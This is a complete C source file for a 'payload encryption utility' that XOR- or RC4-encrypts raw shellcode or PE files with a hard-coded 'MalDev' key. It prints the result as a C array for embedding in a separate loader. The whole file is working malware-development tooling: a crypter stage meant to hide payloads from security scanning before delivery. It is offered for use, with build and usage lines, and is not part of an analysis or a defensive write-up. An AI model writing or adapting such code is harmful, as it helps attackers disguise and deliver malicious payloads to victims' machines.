/*
 * Payload Encryption Utility
 *
 * Encrypts a raw binary file (shellcode or PE) for use with the loader.
 *
 * Build:  cl encrypt_payload.c /Fe:encrypt_payload.exe
 * Usage:  encrypt_payload.exe <input.bin> <output.bin> [--rc4]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef unsigned char BYTE;
typedef unsigned int  DWORD;
typedef unsigned long long SIZE_T;

static BYTE g_Key[] = { 0x4D, 0x61, 0x6C, 0x44, 0x65, 0x76 };  /* "MalDev" */

static void xor_crypt(BYTE *data, SIZE_T len, BYTE *key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < len; i++)
        data[i] ^= key[i % key_len];
}

static void rc4_crypt(BYTE *data, SIZE_T len, BYTE *key, SIZE_T key_len) {
    BYTE state[256];
    for (int i = 0; i < 256; i++) state[i] = (BYTE)i;

    BYTE j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + state[i] + key[i % key_len];
        BYTE tmp = state[i]; state[i] = state[j]; state[j] = tmp;
    }

    BYTE si = 0; j = 0;
    for (SIZE_T k = 0; k < len; k++) {
        si++;
        j += state[si];
        BYTE tmp = state[si]; state[si] = state[j]; state[j] = tmp;
        data[k] ^= state[(BYTE)(state[si] + state[j])];
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <input.bin> <output.bin> [--rc4]\n", argv[0]);
        return 1;
    }

    int use_rc4 = 0;
    if (argc > 3 && strcmp(argv[3], "--rc4") == 0) use_rc4 = 1;

    FILE *fin = fopen(argv[1], "rb");
    if (!fin) { printf("[!] Cannot open %s\n", argv[1]); return 1; }

    fseek(fin, 0, SEEK_END);
    long size = ftell(fin);
    fseek(fin, 0, SEEK_SET);

    BYTE *buf = (BYTE *)malloc(size);
    fread(buf, 1, size, fin);
    fclose(fin);

    printf("[*] Read %ld bytes from %s\n", size, argv[1]);
    printf("[*] Encrypting with %s...\n", use_rc4 ? "RC4" : "XOR");

    if (use_rc4)
        rc4_crypt(buf, size, g_Key, sizeof(g_Key));
    else
        xor_crypt(buf, size, g_Key, sizeof(g_Key));

    FILE *fout = fopen(argv[2], "wb");
    if (!fout) { printf("[!] Cannot create %s\n", argv[2]); free(buf); return 1; }
    fwrite(buf, 1, size, fout);
    fclose(fout);

    printf("[+] Encrypted payload written to %s (%ld bytes)\n", argv[2], size);
    printf("[*] Key: ");
    for (int i = 0; i < sizeof(g_Key); i++) printf("0x%02X ", g_Key[i]);
    printf("\n");

    /* Output as C array for embedding */
    printf("\n[*] C array representation:\n");
    printf("unsigned char payload[] = {\n    ");
    for (long i = 0; i < size; i++) {
        printf("0x%02X", buf[i]);
        if (i < size - 1) printf(", ");
        if ((i + 1) % 16 == 0 && i < size - 1) printf("\n    ");
    }
    printf("\n};\n");
    printf("unsigned int payload_len = %ld;\n", size);

    free(buf);
    return 0;
}
